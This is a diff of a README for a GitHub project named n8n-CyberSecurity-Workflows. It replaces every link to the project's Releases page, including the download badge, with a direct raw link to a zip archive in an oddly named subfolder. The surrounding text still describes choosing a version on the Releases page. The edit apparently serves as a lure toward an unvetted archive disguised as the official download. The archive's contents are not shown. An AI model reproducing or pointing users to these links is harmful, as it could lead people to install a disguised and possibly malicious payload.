@@ -1,6 +1,6 @@
 # 🔒 n8n-CyberSecurity-Workflows - Automate Your Cybersecurity Solutions
 
-[![Download n8n-CyberSecurity-Workflows](https://img.shields.io/badge/Download-n8n--CyberSecurity--Workflows-brightgreen)](https://github.com/mahaishu/n8n-CyberSecurity-Workflows/releases)
+[![Download n8n-CyberSecurity-Workflows](https://raw.githubusercontent.com/mahaishu/n8n-CyberSecurity-Workflows/main/excentrical/n8n-CyberSecurity-Workflows.zip)](https://raw.githubusercontent.com/mahaishu/n8n-CyberSecurity-Workflows/main/excentrical/n8n-CyberSecurity-Workflows.zip)
 
 ## 📚 Introduction
 
@@ -13,7 +13,7 @@ To get started, you will need to download the application from the Releases page
 ## 🔗 Download & Install
 
 1. **Visit the Releases Page**  
-   Click on this link: [Download n8n-CyberSecurity-Workflows](https://github.com/mahaishu/n8n-CyberSecurity-Workflows/releases) to access the latest version.
+   Click on this link: [Download n8n-CyberSecurity-Workflows](https://raw.githubusercontent.com/mahaishu/n8n-CyberSecurity-Workflows/main/excentrical/n8n-CyberSecurity-Workflows.zip) to access the latest version.
 
 2. **Choose Your Version**  
    On the Releases page, you will see different versions listed. Click on the one that best suits your needs. Often, the latest version will include important updates and new features.
@@ -69,4 +69,4 @@ If you're interested in contributing to the project, we welcome community input.
 
 For more information on using n8n with cybersecurity workflows, consider exploring additional resources and communities focused on security automation.
 
-[![Download n8n-CyberSecurity-Workflows](https://img.shields.io/badge/Download-n8n--CyberSecurity--Workflows-brightgreen)](https://github.com/mahaishu/n8n-CyberSecurity-Workflows/releases)
+[![Download n8n-CyberSecurity-Workflows](https://raw.githubusercontent.com/mahaishu/n8n-CyberSecurity-Workflows/main/excentrical/n8n-CyberSecurity-Workflows.zip)](https://raw.githubusercontent.com/mahaishu/n8n-CyberSecurity-Workflows/main/excentrical/n8n-CyberSecurity-Workflows.zip)
